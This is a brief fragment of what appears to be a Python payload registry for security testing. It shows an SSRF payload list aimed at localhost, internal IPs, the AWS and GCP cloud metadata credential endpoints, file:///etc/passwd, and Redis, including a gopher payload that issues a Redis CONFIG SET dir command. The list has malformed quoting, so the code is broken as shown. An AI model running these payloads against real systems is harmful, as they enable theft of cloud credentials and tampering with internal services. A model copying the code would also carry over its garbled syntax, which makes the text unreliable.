...
Consolidated registry of high-impact security payloads.#     LFI_PAYLOADS = [
    ...
    SSRF_PAYLOADS = [
        "http://127.0.0.1:80","        "http://localhost:80","        "http://169.254.169.254/latest/meta-data/iam/security-credentials/","        "http://metadata.google.internal/computeMetadata/v1/","        "http://10.0.0.1:22","        "file:///etc/passwd","        "dict://127.0.0.1:6379/","        ("gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$4%0d%0a/tmp/%0d%0a"),"    ]
